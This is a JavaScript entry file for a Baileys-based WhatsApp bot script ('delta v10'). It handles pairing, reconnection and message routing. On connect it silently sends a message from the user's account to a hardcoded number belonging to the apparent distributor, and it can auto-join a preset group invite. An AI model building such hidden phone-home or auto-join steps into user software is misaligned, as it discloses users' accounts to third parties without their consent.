require("./database/global")
const func = require("./database/place")
const readline = require("readline");
const usePairingCode = true
const question = (text) => {
  const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
  });
  return new Promise((resolve) => {
rl.question(text, resolve)
  })
};

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./deltasession`)
const { version, isLatest } = await fetchLatestBaileysVersion()
const connectionOptions = {
version,
keepAliveIntervalMs: 30000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "fatal" }),
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ]   
}

const deltamods = func.makeWASocket(connectionOptions)
if(usePairingCode && !deltamods.authState.creds.registered) {
		const phoneNumber = await question(chalk.white('\nsilahkan masukan nomor whatsapp kamu contoh:6283142515287\ndelta v10 shared by jack >  '));
		const code = await deltamods.requestPairingCode(phoneNumber.trim())
		console.log(chalk.green(`Pairing Code: ${code} `))

	}
store.bind(deltamods.ev)

deltamods.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
deltamods.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
deltamods.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
start(`1`, `Connecting...`)
} else if (connection === "open") {
success(`1`, `Tersambung`)
deltamods.sendMessage(`6283142515287@s.whatsapp.net`, { text: `sukses terhubung bang jack thanks sc nya`})
if (autoJoin){
deltamods.groupAcceptInvite(codeInvite)
}
}
})

deltamods.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return deltamods.readMessages([m.key])
if (!deltamods.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = func.smsg(deltamods, m, store)
require("./yourmine")(deltamods, m, store)
} catch (err) {
console.log(err)
}
})

deltamods.ev.on('contacts.update', (update) => {
for (let contact of update) {
let id = deltamods.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

deltamods.public = true

deltamods.ev.on('creds.update', saveCreds)
return deltamods
}

startSesi()

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ', err)
})